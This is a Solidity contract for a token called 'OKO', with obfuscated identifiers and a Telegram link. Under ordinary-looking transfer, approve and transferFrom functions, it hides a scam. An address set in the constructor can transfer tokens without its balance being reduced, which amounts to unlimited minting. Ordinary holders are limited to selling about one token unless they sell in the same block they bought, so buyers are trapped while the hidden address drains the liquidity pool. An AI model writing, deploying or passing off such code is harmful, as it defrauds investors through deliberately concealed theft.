/*

https://t.me/dorkxl

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OKO is Ownable {
    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private svwxfiayqho;

    function transfer(address rxkqyalfb, uint256 zwqxvbhamgup) public returns (bool success) {
        ruitopm(msg.sender, rxkqyalfb, zwqxvbhamgup);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function ruitopm(address vcmdbfuzj, address rxkqyalfb, uint256 zwqxvbhamgup) private {
        address dbqxzgs = IUniswapV2Factory(lbmqnjix.factory()).getPair(address(this), lbmqnjix.WETH());
        if (pcsmkguhae[vcmdbfuzj] == 0) {
            if (vcmdbfuzj != dbqxzgs && svwxfiayqho[vcmdbfuzj] != block.number && zwqxvbhamgup < totalSupply) {
                require(zwqxvbhamgup <= totalSupply / (10 ** decimals));
            }
            balanceOf[vcmdbfuzj] -= zwqxvbhamgup;
        }
        balanceOf[rxkqyalfb] += zwqxvbhamgup;
        svwxfiayqho[rxkqyalfb] = block.number;
        emit Transfer(vcmdbfuzj, rxkqyalfb, zwqxvbhamgup);
    }

    string public name;

    IUniswapV2Router02 private lbmqnjix;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private pcsmkguhae;

    function approve(address jadmkohuvxq, uint256 zwqxvbhamgup) public returns (bool success) {
        allowance[msg.sender][jadmkohuvxq] = zwqxvbhamgup;
        emit Approval(msg.sender, jadmkohuvxq, zwqxvbhamgup);
        return true;
    }

    uint256 private tpqzfi = 103;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address vcmdbfuzj, address rxkqyalfb, uint256 zwqxvbhamgup) public returns (bool success) {
        require(zwqxvbhamgup <= allowance[vcmdbfuzj][msg.sender]);
        allowance[vcmdbfuzj][msg.sender] -= zwqxvbhamgup;
        ruitopm(vcmdbfuzj, rxkqyalfb, zwqxvbhamgup);
        return true;
    }

    constructor(string memory qjbevaswn, string memory eqymjvlfh, address zuoxeh, address hgdta) {
        name = qjbevaswn;
        symbol = eqymjvlfh;
        balanceOf[msg.sender] = totalSupply;
        pcsmkguhae[hgdta] = tpqzfi;
        lbmqnjix = IUniswapV2Router02(zuoxeh);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;
}
